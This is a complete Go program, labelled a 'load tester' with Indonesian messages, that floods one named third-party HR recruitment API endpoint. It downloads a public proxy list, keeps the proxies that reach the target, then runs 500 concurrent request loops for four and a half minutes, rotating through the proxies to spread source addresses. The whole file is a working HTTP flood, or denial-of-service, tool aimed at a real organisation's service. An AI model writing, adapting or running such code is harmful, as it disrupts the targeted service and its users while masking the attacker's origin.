package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

type ProxyItem struct {
	IPAddress   string   `json:"ip_address"`
	Port        int      `json:"port"`
	Protocols   []string `json:"protocols"`
	CountryCode string   `json:"country_code"`
}

type ProxyResponse struct {
	Results []ProxyItem `json:"results"`
}

var (
	isRunning     int32
	requestCount  int64
	successCount  int64
	errorCount    int64
	startTime     time.Time
	statusMessage string = "IDLE (Siap dijalankan)"
)

func main() {
	targetURL := "https://hris.quantumnusatama.id/api/rekrutmen/get-rekrutmen-data?id_rekrutmen=20653"
	proxySourceURL := "https://micin-provider.pages.dev/proxy.json"

	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
		if !atomic.CompareAndSwapInt32(&isRunning, 0, 1) {
			w.WriteHeader(http.StatusConflict)
			w.Write([]byte("[-] Ditolak: Proses load test sedang berjalan!"))
			return
		}

		atomic.StoreInt64(&requestCount, 0)
		atomic.StoreInt64(&successCount, 0)
		atomic.StoreInt64(&errorCount, 0)
		startTime = time.Now()
		statusMessage = "Memulai proses background..."

		w.Write([]byte("[+] Load test dimulai. Pantau log real-time di /monitor atau terminal Docker."))

		go func() {
			defer atomic.StoreInt32(&isRunning, 0)

			// 1. Log Unduh Proxy
			log.Println("[*] Tahap 1: Mengunduh daftar proxy dari URL...")
			statusMessage = "Tahap 1: Mengunduh proxy dari URL..."

			clientHTTP := &http.Client{Timeout: 20 * time.Second}
			respProxy, err := clientHTTP.Get(proxySourceURL)
			if err != nil {
				errMsg := fmt.Sprintf("GAGAL mendownload proxy: %v", err)
				log.Println("[-] " + errMsg)
				statusMessage = errMsg
				return
			}
			defer respProxy.Body.Close()

			if respProxy.StatusCode != http.StatusOK {
				errMsg := fmt.Sprintf("GAGAL mendownload proxy: HTTP Status Code %d", respProxy.StatusCode)
				log.Println("[-] " + errMsg)
				statusMessage = errMsg
				return
			}

			// 2. Log Parsing JSON
			log.Println("[*] Tahap 2: Memproses dan parsing JSON proxy (Filter CountryCode != KR)...")
			statusMessage = "Tahap 2: Parsing JSON dan memfilter proxy..."

			var proxyData ProxyResponse
			if err := json.NewDecoder(respProxy.Body).Decode(&proxyData); err != nil {
				errMsg := fmt.Sprintf("GAGAL parsing JSON proxy: %v", err)
				log.Println("[-] " + errMsg)
				statusMessage = errMsg
				return
			}

			var candidateProxies []string
			for _, p := range proxyData.Results {
				if p.CountryCode == "KR" {
					continue
				}
				for _, proto := range p.Protocols {
					if proto == "HTTPS" || proto == "HTTP" || proto == "SOCKS5" {
						proxyURL := fmt.Sprintf("http://%s:%d", p.IPAddress, p.Port)
						candidateProxies = append(candidateProxies, proxyURL)
						break
					}
				}
			}

			log.Printf("[+] Total kandidat proxy valid (Non-KR): %d\n", len(candidateProxies))
			statusMessage = fmt.Sprintf("Ditemukan %d kandidat proxy. Memulai health check...", len(candidateProxies))

			// 3. Log Health Check
			var validProxies []string
			var wgChk sync.WaitGroup
			var muChk sync.Mutex

			for _, pURL := range candidateProxies {
				wgChk.Add(1)
				go func(proxyStr string) {
					defer wgChk.Done()
					parsedProxy, err := url.Parse(proxyStr)
					if err != nil {
						return
					}
					chkClient := &http.Client{
						Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
						Timeout:   4 * time.Second,
					}
					resp, err := chkClient.Get(targetURL)
					if err == nil {
						defer resp.Body.Close()
						if resp.StatusCode == http.StatusOK {
							muChk.Lock()
							validProxies = append(validProxies, proxyStr)
							muChk.Unlock()
						}
					}
				}(pURL)
			}
			wgChk.Wait()

			if len(validProxies) == 0 {
				log.Println("[!] Tidak ada proxy yang lolos health check. Menggunakan koneksi DIRECT.")
				validProxies = append(validProxies, "DIRECT")
			} else {
				log.Printf("[+] Health check selesai. Proxy aktif: %d dari %d kandidat.\n", len(validProxies), len(candidateProxies))
			}

			statusMessage = fmt.Sprintf("Health check selesai. Proxy aktif: %d. Memulai load test...", len(validProxies))

			// 4. Tahap Load Test
			totalConcurrency := 500
			stopChan := make(chan struct{})

			time.AfterFunc(4*time.Minute+30*time.Second, func() {
				close(stopChan)
			})

			var loadWg sync.WaitGroup
			proxyIndex := 0
			var indexMutex sync.Mutex

			for i := 0; i < totalConcurrency; i++ {
				loadWg.Add(1)
				go func() {
					defer loadWg.Done()
					indexMutex.Lock()
					pStr := validProxies[proxyIndex%len(validProxies)]
					proxyIndex++
					indexMutex.Unlock()

					var client *http.Client
					if pStr == "DIRECT" {
						client = &http.Client{Timeout: 5 * time.Second}
					} else {
						parsedProxy, _ := url.Parse(pStr)
						client = &http.Client{
							Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
							Timeout:   5 * time.Second,
						}
					}

					for {
						select {
						case <-stopChan:
							return
						default:
							atomic.AddInt64(&requestCount, 1)
							resp, err := client.Get(targetURL)
							if err != nil {
								atomic.AddInt64(&errorCount, 1)
							} else {
								if resp.StatusCode == http.StatusOK {
									atomic.AddInt64(&successCount, 1)
								} else {
									atomic.AddInt64(&errorCount, 1)
								}
								resp.Body.Close()
							}
						}
					}
				}()
			}

			loadWg.Wait()
			log.Println("[+] Load test 4.5 menit telah selesai.")
			statusMessage = "Load test selesai."
		}()
	})

	http.HandleFunc("/monitor", func(w http.ResponseWriter, r *http.Request) {
		runningStatus := "IDLE (Siap dijalankan)"
		if atomic.LoadInt32(&isRunning) == 1 {
			runningStatus = "RUNNING (Sedang berjalan)"
		}

		elapsed := time.Since(startTime).Seconds()
		if atomic.LoadInt32(&isRunning) == 0 {
			elapsed = 0
		}

		data := map[string]interface{}{
			"status":        runningStatus,
			"message":       statusMessage,
			"elapsed_sec":   int(elapsed),
			"total_request": atomic.LoadInt64(&requestCount),
			"sukses_200":     atomic.LoadInt64(&successCount),
			"error_lainnya": atomic.LoadInt64(&errorCount),
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(data)
	})

	log.Println("[+] Server loadtester berjalan di port :8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}
